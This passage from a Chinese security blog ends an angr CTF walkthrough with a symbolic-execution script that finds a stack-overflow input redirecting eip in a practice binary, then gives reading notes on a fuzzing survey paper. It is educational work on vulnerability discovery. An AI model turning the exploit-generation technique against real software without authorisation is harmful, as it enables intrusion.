<code>save_unsat=True</code>，则被认为无法被满足的（unsatisfiable，即存在<strong>约束冲突</strong>的状态，例如在同一时刻要求输入既是<code>&quot;AAAA&quot;</code> 又是 <code>&quot;BBBB&quot;</code>）状态会被归入该列表</li></ul><p>还有一种不是 stash 的状态列表——<code>errored</code>，若在执行中产生了错误，则状态与其产生的错误会被包裹在一个 <code>ErrorRecord</code> 实例中（可通过 <code>record.state</code> 与 <code>record.error</code> 访问），该 record 会被插入到 <code>errored</code> 中，我们可以通过 <code>record.debug()</code> 启动一个调试窗口</p><h4 id="②-stash-操作"><a href="#②-stash-操作" class="headerlink" title="② stash 操作"></a>② stash 操作</h4><p>我们可以使用 <code>stash.move()</code> 来在 stash 之间转移放置状态，用法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>)<br></code></pre></td></tr></table></figure><p>在转移当中我们还可以通过指定 <code>filter_func</code> 参数来进行过滤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>, filter_func = filter_func)<br></code></pre></td></tr></table></figure><p>stash 本质上就是个 list，因此在初始化时我们可以通过字典的方式指定每个 stash 的初始内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr = proj.factory.simgr(init_state,<br><span class="hljs-meta">... </span>    stashes = &#123;<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;found&#x27;</span>:[],<br><span class="hljs-meta">... </span>    &#125;)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-7"><a href="#FINAL-EXPLOIT-7" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么由于本题我们需要通过栈溢出来控制 eip，属于 unconstrained 的状态，因此<strong>我们需要手动判断是否找到了 unconstrained 状态</strong>，于是与此前不同的是本题我们通过 <code>simgr.step()</code> 来进行单步执行，若其中某一步获得了 unconstrained state 则我们遍历其中状态并判断是否可以满足控制 eip 为指定值的约束，若是则直接添加到 <code>simgr.found</code> 列表中即可</p><p>故最终的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-comment"># filter to check satisfiability</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br>    print_good_addr = <span class="hljs-number">0x58465168</span><br>    <span class="hljs-keyword">return</span> state.satisfiable(extra_constraints = (state.regs.eip == print_good_addr, ))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, input_addr</span>):<br>            input_bvs = claripy.BVS(<span class="hljs-string">&#x27;input_addr&#x27;</span>, <span class="hljs-number">200</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> input_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(input_addr, input_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>] = input_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-comment"># create simgr that can save unconstraints</span><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, <br>                               save_unconstrained=<span class="hljs-literal">True</span>,<br>                               stashes = &#123;<br>                                   <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br>                                   <span class="hljs-string">&#x27;unconstrained&#x27;</span>:[],<br>                                   <span class="hljs-string">&#x27;found&#x27;</span>:[],<br>                               &#125;)<br><br>    <span class="hljs-comment"># simulated execution by steps</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> simgr.found:<br>        <span class="hljs-comment"># no more states for execution</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> simgr.active) <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> simgr.unconstrained):<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-comment"># check for unconstrained states</span><br>        simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, <br>                  to_stash = <span class="hljs-string">&#x27;found&#x27;</span>,<br>                  filter_func = filter_func)<br><br>        <span class="hljs-comment"># step to next basic block</span><br>        simgr.step()<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] found &#123;&#125; solution state(s)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(simgr.found)))<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        print_good_addr = <span class="hljs-number">0x58465168</span><br>        solution_state.add_constraints(solution_state.regs.eip == print_good_addr)<br>        input_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>], <br>                                               cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(input_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/03/Zf6w1xrNFc5HvLI.png" alt="image.png"></p><p>至此，angr CTF 的 18 道题目<strong>全部完结</strong></p><h1 id="0xFF-What’s-more…"><a href="#0xFF-What’s-more…" class="headerlink" title="0xFF.What’s more…"></a>0xFF.What’s more…</h1><p>作为用来入门 angr 基本用法的题目，angr CTF 自然不会太难，不过笔者确乎通过 angr 体会到了<strong>符号执行这一技术的美感所在</strong>（虽然说这个感触好像比较玄学 : ) ）</p><p>不同于代码审计或是比较偏“暴力”的 fuzz，符号执行这一技术还向我们展现了具有别样美感的漏洞挖掘与 exp 编写技巧，以 angr CTF 为例，虽然说最后三道漏洞利用题目看起来好像都挺笨，但设想将第 17 题换成这样的一个场景——我们正在挖掘一个逻辑比较复杂的现代软件（例如一个存在栈溢出的路由器固件，我们的输入可以是向路由器发送的数据包（比如说对路由器控制页的 HTTP 请求）），直接逆向审计比较费劲，而暴力 fuzz 又不好搭执行环境，此时无需实际执行二进制文件的符号执行便能很好地发挥其用处</p><p>不过需要注意的是以上的 18 道题虽然看似涵盖了 angr 的基本用法，但其实 angr 还有更多更有趣的 API，若是要更加熟练的运用这个顶级的混合执行框架，则还需要我们多多阅读 angr 的文档并多加使用，毕竟 angr-ctf 只是一个最基础的练手级的项目（笑）</p><p>符号执行这一技术或许还有更为光明的未来正等待着我们进行探索：）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;你说的对，但是 &lt;a href=&quot;https://github.com/angr/angr&quot;&gt;angr&lt;/a&gt; 是一个使用 Python 编写的跨平台开源二进制分析框架…&lt;/p&gt;</summary>
    
    
    
    <category term="ANGR" scheme="https://arttnba3.github.io/categories/ANGR/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="angr" scheme="https://arttnba3.github.io/tags/angr/"/>
    
    <category term="符号执行" scheme="https://arttnba3.github.io/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="二进制安全" scheme="https://arttnba3.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    <category term="二进制分析" scheme="https://arttnba3.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x00】论文笔记：Fuzzing: A Survey for Roadmap </title>
    <link href="https://arttnba3.github.io/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/"/>
    <id>https://arttnba3.github.io/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/</id>
    <published>2022-10-30T02:35:21.000Z</published>
    <updated>2022-10-30T12:18:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>模糊测试为什么是神</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><em><strong>Fuzzing: A Survey for Roadmap</strong></em> 是关于模糊测试领域的比较好的一篇综述，而恰巧笔者想要开始接触一些学术上的东西，所以决定从这篇综述性论文开始入手去了解模糊测试这一领域：）</p><p>这篇博客便是笔者的一个读书笔记，不过笔者不会将论文全部人工翻译后原样照搬过来，而只会选择比较精髓的部分，并按笔者的意思进行排版（笑）</p><blockquote><p>当然现在看来好像大部分其实还是照搬笔者人工翻译后的论文原文，笔者做的额外工作好像仅仅是排版优化…</p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><strong>Fuzz testing</strong>（fuzzing，即模糊测试）在检测安全漏洞中大放异彩，其通过生成大量的测试用例（test cases）并观测执行结果来寻找漏洞，且已在大量的应用中发现了上千个漏洞。虽然非常高效，fuzz 仍缺乏系统化的对其缺陷的分析：</p><ul><li>fuzz 需要缩小<strong>输入空间</strong>（input space）与<strong>缺陷空间</strong>（defect space，触发缺陷的输入）间的差距；在一个应用当中，漏洞（defects）的存在是分散的（spare），这意味着 defects space 要比 input space 小得多</li><li>fuzzing 生成大量的测试用例进行重复测试——这需要一种自动化的方法；由于程序与漏洞的复杂性，自动化地执行不同的程序会是一个挑战</li></ul><p>本篇论文系统化地回顾并评估了 fuzz 的缺陷机器解决办法</p><h1 id="0x01-INTRODUCTION"><a href="#0x01-INTRODUCTION" class="headerlink" title="0x01. INTRODUCTION"></a>0x01. INTRODUCTION</h1><p>软件漏洞是计算机系统中的一个严重的问题，而 Fuzz testing 已经成为最成功的检测程序漏洞的方法之一，其通过生成大量的测试用例来重复测试目标程序并观察其<strong>异常</strong>（exception）——安全漏洞的标志（indicator）</p><p>Fuzzing 通常有着一组种子（seeds）：interesting inputs，新的输入的生成则基于这组种子进行无限的变异（mutate）</p><p>虽然 fuzzing 在发现安全漏洞上获得了巨大的成功，在开发高效的漏洞检测解决方案上仍存在着缺陷，如 Fig.1 所示，三个主要的缺陷是：输入中分散的漏洞空间，严格的有效输入空间，多目标的自动化执行</p><p><img src="https://s2.loli.net/2022/10/26/MoW9IBHGRvk35bV.png" alt="Fig. 1. Illustration of knowledge gaps in the domain of fuzzing. "></p><ul><li><strong>Gap 1: spare defect space of inputs.</strong> 在应用程序中的漏洞分布是分散的，而仅有部分特定的输入能够触发漏洞；浅显的漏洞可以在短时间内被 fuzz 到，但许多安全漏洞需要测试复杂的执行路径并解决严格的路径约束，因此一个高效的 fuzzing 算法需要同时对 <em>待测试程序</em> （program under test， <strong>PUTs</strong>）与 <em>安全缺陷</em> （security flaws）足够精通，以在一个更有可能存在漏洞的代码区域驱动计算资源</li><li><strong>Gap 2: strict valid input space.</strong> 大部分程序有着自己的输入空间，而现代程序都相当复杂，需要更复杂的特化输入空间，因此如何生成有效输入同样是个挑战；此外，为了提高 fuzzing 的效率，生成的输入应当使用不同的执行状态（例如 <em>代码覆盖率</em> ），这需要更先进的方案来生成有效输入；若缺乏对 PUTs 的系统化分析，几乎不可能精确地限制输入空间（例如 PDF 文件的变异生成可能会违反 PDF 规范）</li><li><strong>Gap 3: various target.</strong> 由于 fuzzing 大量重复地测试 PUTs，这需要高效的自动化方法。PUTs 与漏洞都是多种多样的，有的程序可以简单直接地被自动化地 fuzz（例如命令行程序），但许多程序在自动化测试前都需要做大量的工作（例如硬件）；此外，安全缺陷同样需要自动化的 indicator 以记录潜在的真正漏洞，<strong>程序崩溃</strong>是一个常用的 indicator 因为其可以被 OS 自动捕获，但有的安全缺陷<strong>并不会表现出崩溃</strong>（例如条件竞争），这需要精心设计的 indicator</li></ul><p>业界在缩小这些缺陷上做出了许多努力。在本篇论文中，研究者系统化地回顾与分析了 fuzzing 的缺陷与解决方案，同时考虑了广度与深度</p><p>本篇论文目录如下：</p><ul><li><strong>§2</strong>：overview of fuzzing</li><li><strong>§3</strong>：depicts fuzzing processes and various fuzzing theories to formulate he processes</li><li><strong>§4</strong>：analyzes diverse solutions to reduce the search space of inputs</li><li><strong>§5</strong>：analyzes how to automatize the execution of various PUTs and the detection of different bugs.</li><li><strong>§6</strong>：other some directions for future research</li></ul><h1 id="0x02-OVERVIEW-OF-FUZZING"><a href="#0x02-OVERVIEW-OF-FUZZING" class="headerlink" title="0x02. OVERVIEW OF FUZZING"></a>0x02. OVERVIEW OF FUZZING</h1><p><img src="https://s2.loli.net/2022/10/26/u6F7mKtzvRqxNWo.png" alt="Fig. 2. General workflow of fuzzing."></p><p>我们首先介绍一些术语（ <strong>Terminologies.</strong> ），如 Fig2 所示：</p><ul><li><strong>seed</strong>：被保留的能完成更好的 fitness 的输入（例如提供新的覆盖率）</li><li><strong>fitness</strong>：对一个 input&#x2F;seed 的质量的测量</li><li><strong>power schedule</strong>：决定了分配给 seeds 的 energy</li><li><strong>energy</strong>：分配给当前 fuzzing round 的变异数量</li><li><strong>fuzzer</strong>：fuzzing 算法的实现</li></ul><blockquote><p>这里论文还讲了一段历史，不抄了</p></blockquote><p>如 Fig2 所示，fuzzing 由三部分组成：</p><ul><li><strong>input generator</strong>：负责向 executor 提供输入</li><li><strong>executor</strong>：负责执行输入</li><li><strong>defect monitor</strong>：负责检查是否发现了新的执行状态或缺陷（例如 crashes）</li></ul><p>基于输入的生成方式，fuzzing 可以分为：</p><ul><li><strong>基于生成的</strong> （generation-based）：基于 <em>文法</em> （grammars）或 <em>有效语料库</em> （valid corpus）从头开始生成；如 Fig2 所示，其从一组种子中直接获得输入</li><li><strong>基于变异的</strong>（mutation-based）：对现有的种子进行 <em>变异</em> （mutate）以获得新的输入；对给定的一组种子，基于变异的模糊测试通过 seed schedule、byte schedule、mutation schedule 以获得输入</li></ul><blockquote><p>需要注意的是，fuzzing 并不需要经历 Fig2 中的所有步骤，例如基于生成的模糊测试并不执行 byte schedule 或 mutation schedule，但关注于从初始输入文件中选择最优的种子组</p></blockquote><p>基于执行时观测到的信息量，fuzzing 可以分为：</p><ul><li><strong>黑盒</strong>（blackbox）：黑盒模糊测试并不知道每次执行的内部状态，通过使用输入格式化或不同的输出状态来进行优化</li><li><strong>白盒</strong>（whitebox）：白盒模糊测试对每次执行的内部状态是全部得知的，这使其能系统化地探索目标程序的状态空间；其通常使用 concolic execution（例如 <em>dynamic symbolic execution，即动态符号执行</em> ）来分析目标程序</li><li><strong>灰盒</strong>（greybox）：灰盒模糊测试获得的执行状态信息在黑盒与白盒之间，例如许多 fuzzer 都使用 <em>边界覆盖率</em> （edge coverage）作为内部执行状态</li></ul><p>最通用的执行状态便是<strong>代码覆盖率</strong>（code coverage，例如 CFGs（control flow graphs） 中的基本块（basic block、边（edges）），覆盖率的基本假设用法是：发现更多的执行状态（例如新的覆盖率）能提高发现漏洞的概率。因此 <em>覆盖率指导</em> （coverage-guided）的模糊测试的目标便是覆盖更多的代码</p><blockquote><p> 但执行状态并不限制于代码覆盖率，对面向对象程序（object-oriented programs）而言也可以是执行的合法性（legality），对协议实现（protocol implementations）可以是状态机（state machine），对并发实现（concurrency）可以是 alias coverage，对深度学习模型（deep learning models）可以是神经覆盖率（neuron coverage），对安卓智能电视则可以是执行日志（execution logs）</p></blockquote><p>Fuzzer 通常使用 <em>崩溃</em> （crashes）作为安全漏洞的指示器，因为 crashes 提供了直接的自动记录（OS 会自动发出信号告知程序崩溃），然而有的缺陷并不会显示出 crashes，因此 fuzzer 使用其他的指示器，例如 physical safety violation</p><p>但 indicators 仅显示了可能的安全问题，还需要安全工具或人工确认这是一个 <em>漏洞</em> （vulnerability）</p><h1 id="0x03-FUZZING-THEORY"><a href="#0x03-FUZZING-THEORY" class="headerlink" title="0x03. FUZZING THEORY"></a>0x03. FUZZING THEORY</h1><p>为了提高发现漏洞的概率，fuzzer 在执行过程中使用反馈（feedback）机制，例如以执行状态或结果作为 fitnes，一个典型的 fitness 便是基于代码覆盖率（例如基本块或边）进行输入生成，但仅有代码覆盖率<strong>并非一直都是可靠的</strong>，就算可靠也可能收益不高（例如指数型数量的输入生成可能只带来线性的漏洞发现），因此一种常见的改进方法是优化模糊测试的过程或是为 fitness 丰富信息，Table 1 展示了不同的 fuzzer 的优化方法：</p><p><img src="https://s2.loli.net/2022/10/26/tgGbHp5JRn8zkIS.png" alt="Table 1. Fuzzers and their optimization solutions. "></p><h2 id="3-1-Seed-Set-Selection"><a href="#3-1-Seed-Set-Selection" class="headerlink" title="3.1 Seed Set Selection"></a>3.1 Seed Set Selection</h2><p>对种子集的优化关注于<strong>最小化种子集的大小</strong>，例如选择能覆盖所有已发现代码覆盖的一组最少的种子，因为过于富集的种子会在检验已探测代码区域上浪费计算资源</p><blockquote><p>在 <a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/rebert">UESIX 的一篇论文</a> 中其被表述为 <em>最小覆盖集问题</em> （minimal set coverage problem，MSCP） </p></blockquote><h2 id="3-2-Seed-Schedule"><a href="#3-2-Seed-Schedule" class="headerlink" title="3.2 Seed Schedule"></a>3.2 Seed Schedule</h2><p><strong>种子调度</strong>（seed schedule）期望解决如下问题：</p><ul><li>在下一轮中选择哪个种子</li><li>为该种子分配的时间预算（time budget）；大部分 fuzzer 实际上选择优化对被选取种子的变异次数</li></ul><p>由于 PUTs 与漏洞的复杂性，未发现代码覆盖率与未发现漏洞是不可知的，我们无法知道一个输入是否能触发漏洞，类似地在检索代码之前我们也不能获得程序行为的概率分布，因此数学上我们几乎不可能找到一个全面的优化解法，因此研究人员基于多种优化方法来近似地解决这个问题</p><h3 id="3-2-1-Fitness-by-Bugs"><a href="#3-2-1-Fitness-by-Bugs" class="headerlink" title="3.2.1 Fitness by #Bugs"></a><em>3.2.1 Fitness by #Bugs</em></h3><p>通常而言在模糊测试过程中使用两种 fitness 进行优化：1）基于漏洞 2）基于执行状态（例如代码覆盖率）</p><p>由于 fuzzing 的目的是发现漏洞，发现漏洞的数量便是一种最简单的 fitness，一种方法便是在随机&#x2F;顺序选择种子的时候调度每个种子的时间预算，在不考虑执行状态的情况下， <em>最大化漏洞数量问题</em>  可以被简化为一个 <strong>整数线性规划</strong>（Integer Linear Programming，ILP）问题，即在线性约束下最大化漏洞数量——以解决这样的 ILP 问题来自动计算每个种子的时间预算</p><p>另外一种认知是将漏洞发现的过程视作 <strong>带权奖券收集问题</strong>（Weighted Coupon Collector’s Problem，<del>不懂的建议翻概率论课本虽然👴的概率论也是挂得一塌糊涂</del>）：fuzzing 中发现的每个独特的漏洞都被视作一种“奖券”，WCCP 期望以此预测发现下个“奖券”所需要的尝试的数量（时间预算）</p><p>ILP 与 WCCP 都是为了将更多的时间于是分配给更有潜力的种子以发现更多漏洞</p><h3 id="3-2-2-Fitness-by-State-Transition（Markov-Chain）"><a href="#3-2-2-Fitness-by-State-Transition（Markov-Chain）" class="headerlink" title="3.2.2 Fitness by State Transition（Markov Chain）"></a><em>3.2.2 Fitness by State Transition（Markov Chain）</em></h3><p>由于漏洞在 PUTs 中的分布是分散的，若以已发现漏洞为 fitness，则 fuzzing 只会关注与已发现漏洞相关的代码区域，这有可能无法获得更多的代码覆盖，这种情况下需要复杂条件的 <em>深层漏洞</em> 则能逃过 fuzzer 的法眼</p><p>为了缓解这个问题，fuzzer 基于<strong>执行状态</strong>（execution state，例如代码覆盖率）计算 fitness，因为执行状态能提供更多的信息；现有的 fuzzer 通常使用代码覆盖率来计算 fitness，因为更高的代码覆盖率意味着更高的发现漏洞的可能性</p><p>如 Fig2 所示，若模糊测试能成功地表示状态迁移，其能高效地指引模糊测试以探索未发现的状态，一个热门的建模方法便是 <strong>马尔科夫链</strong>（Markov Chain），其中一种解决方案是将 CFGs 中的一个基本块视作一个状态，状态转移即为基本块的执行迁移，fuzzer 通过在 fuzzing 过程中记录基本块的跳转频率来计算概率</p><blockquote><p>简而言之，马尔科夫链维护一个概率表（probability table），元素 <em>p<sub>ij</sub></em> 表示从状态 <em>i</em> 转移到状态 <em>j</em> 的概率</p><p><img src="https://s2.loli.net/2022/10/26/NFoAY1aEyUGvxVi.png" alt="image.png"></p></blockquote><p>有了基于马尔科夫链计算的 fitness，fuzzer 可以指导算力的分配，或是选择使用符号执行解决最困难的路径（最低的转移概率）；通常而言，转移概率越低，fitness 越好，因为能轻易到达的代码区域会比难以到达的区域更容易被充分探索</p><p>基于变异的模糊测试中通过对种子进行变异生成新的输入，每次输入运行了一条执行链，这提供了另一种基于马尔科夫链的视角：状态被定义为一个输入的一条执行路径，状态转移则为对输入 <em>t<sub>i</sub></em> 的变异，生成新的输入 <em>t<sub>j</sub></em> ，即由路径 <em>i</em> 迁移到路径  <em>j</em> ，fuzzer 在 fuzzing 过程中动态计算路径迁移的概率</p><blockquote><p>论文给出了这个例子：<a href="https://ieeexplore.ieee.org/abstract/document/8233151">AFLFast</a></p></blockquote><h3 id="3-2-3-Fitness-by-State-Transition（Multi-Armed-Bandit）"><a href="#3-2-3-Fitness-by-State-Transition（Multi-Armed-Bandit）" class="headerlink" title="3.2.3 Fitness by State Transition（Multi-Armed Bandit）"></a><em>3.2.3 Fitness by State Transition（Multi-Armed Bandit）</em></h3><p>马尔科夫链需要基于对所有状态已知来做出合适选择，但在 fuzzing 过程中并非所有状态都已被执行，因此马尔科夫链并非最优解</p><p>对于基本块转移，可以在数据统计中使用 <em>rule of three</em> （👴也不知道啥玩意，妹查到）；对于路径转移，可以使用轮询调度算法将时间预算平均分配给每个种子，然而这种方法无法决定什么时候从轮询调度切换到马尔科夫链——在遍历所有种子与关注特点种子间进行平衡，这便是一个经典的 <code>exploration vs. exploitation</code> 问题</p><p>一个更好的解决  <code>exploration vs. exploitation</code>  问题的方法便是使用 <strong>多臂老虎机</strong>（Multi-Armed Bandit，MAB，<del>又到了概率论学得稀烂的👴扣问号的时间</del>）表示路径转移：种子 <em>t<sub>i</sub></em> 被视作一条“臂”，“奖励”则是由种子 <em>t<sub>i</sub></em> 生成的一条新路径的发现</p><blockquote><p>论文给出了这个例子：<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/yue">EcoFuzz</a></p></blockquote><h3 id="3-2-4-Fitness-by-State-Discovery"><a href="#3-2-4-Fitness-by-State-Discovery" class="headerlink" title="3.2.4 Fitness by State Discovery"></a><em>3.2.4 Fitness by State Discovery</em></h3><p>马尔科夫链与多臂老虎机都能表示程序的状态迁移，然而模糊测试的基本目标是发现新的状态（新的代码覆盖率、新的漏洞、新的崩溃），由此模糊测试过程也可以表示为一个 <strong>物种发现问题</strong>（species discovery problem）： <em>生态学家从野外收集大量样本，样本中的物种可能丰富或稀少，生态学家以此推断集聚的性质，包括未发现的样本</em> ——类似地，<strong>由 fuzzer 生成的输入即为“已收集到的样本”，输入空间即为“集聚”（assemblage）</strong>，fuzzing 基于特定标准将输入进行分类</p><blockquote><p>例如一条执行路径可以是一个物种，执行这条路径的输入属于该物种，一个稀有物种即为较少输入执行到的路径，这引导着 fuzzer 去发现新的“物种”——新的路径→新的状态</p></blockquote><blockquote><p>论文给出了这个例子：<a href="https://mboehme.github.io/paper/FSE20.Entropy.pdf">Entropic</a></p></blockquote><h2 id="3-3-Byte-Schedule"><a href="#3-3-Byte-Schedule" class="headerlink" title="3.3 Byte Schedule"></a>3.3 Byte Schedule</h2><p><strong>字节调度</strong>（Byte Schedule）决定了 <em>选择种子中一个字节来变异</em> 的频率。大部分 fuzzer 基于执行信息来试探性地或随机地选择字节，这需要比 seed schedule 对程序行为有着更深刻的了解（例如路径约束或数据流），由此 fuzzer 可以关注于一个不那么复杂的问题——字节如何影响模糊测试的过程，称为字节的<strong>重要性</strong>（importance）</p><p>由于大部分灰盒 fuzzer 使用 <em>边覆盖率</em> 来测试 PUTs，第一种方法便是将重要性定义为 <em>字节如何影响分支行为</em></p><blockquote><p>论文给出了这些例子：<a href="https://arxiv.org/abs/1807.05620">NEUZZ</a>、<a href="https://arxiv.org/abs/2005.12392">MTFuzz</a></p></blockquote><p>另一种量化字节的重要性的方法是基于种子的 fitness 进行定义，在 fuzzing 过程中可以关注能提升 fitness 的字节：若对于一个字节的改变提升了种子的 fitness，则增加该种子的分数</p><blockquote><p>论文给出了这个例子：<a href="https://dl.acm.org/doi/10.1145/3460120.3484596">AFLChurn</a></p></blockquote><h2 id="3-4-Mutation-Operator-Schedule"><a href="#3-4-Mutation-Operator-Schedule" class="headerlink" title="3.4 Mutation Operator Schedule"></a>3.4 Mutation Operator Schedule</h2><p>如 Fig2 所示，输入生成器的最后一步是选择一个变异器（mutation operator，即mutator）来对选择的字节进行变异，<strong>变异调度</strong>（mutation schedule）决定了下次变异所用的变异器</p><blockquote><p>论文给出了这些例子：</p><ul><li><a href="https://dl.acm.org/doi/10.1145/2908080.2908095">Classfuzz</a>：使用 <em>马尔科夫链蒙特卡洛方法</em> （Markov chain Monte Carlo） 建模变异调度</li><li><a href="">MOPT</a>：使用 <em>粒子群优化</em> （Particle swarm optimization）建模变异选择过程</li></ul></blockquote><h2 id="3-5-Diverse-Information-For-Fitness"><a href="#3-5-Diverse-Information-For-Fitness" class="headerlink" title="3.5 Diverse Information For Fitness"></a>3.5 Diverse Information For Fitness</h2><p>Fitness 除了调度种子、字节、变异器以外，还可以被用于指导种子存留：输入由种子变异而来，若一个输入探索到新的执行状态，其便被保留为新的种子，在种子调度中常选择新的种子；大部分的覆盖率指导的 fuzzer 基于边覆盖率来保留种子</p><p>为了提高发现漏洞的能力，需要更敏感的代码覆盖率带来更多的执行状态信息；另一方面，新类型的 fitness 也被为一些特殊场景设计了出来，例如深度学习模型或机器装置</p><p><img src="https://s2.loli.net/2022/10/26/PbVfo5HKp9e6aBy.png" alt="Fig. 3. Sensitivity and limitation of code coverage."></p><h3 id="3-5-1-Sensitive-Code-Coverage"><a href="#3-5-1-Sensitive-Code-Coverage" class="headerlink" title="3.5.1 Sensitive Code Coverage"></a>3.5.1 Sensitive Code Coverage</h3><p>fitness 的敏感度标识区分执行状态的能力，大部分覆盖率指导的 fuzzer 使用一个位图来提供边覆盖率信息：</p><ul><li>位图中的每个元素下标表示一个边标识符（edge identifier），并为边标识符计算哈希值 